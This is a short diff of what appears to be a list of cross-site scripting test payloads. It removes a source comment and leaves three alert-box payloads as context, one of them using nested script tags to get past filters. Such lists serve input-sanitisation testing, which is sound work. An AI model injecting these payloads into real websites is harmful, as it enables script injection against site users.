@@ -1,4 +1,3 @@
-// https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
 <script>alert('XSS')</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 <img src=x onerror=alert('XSS');>
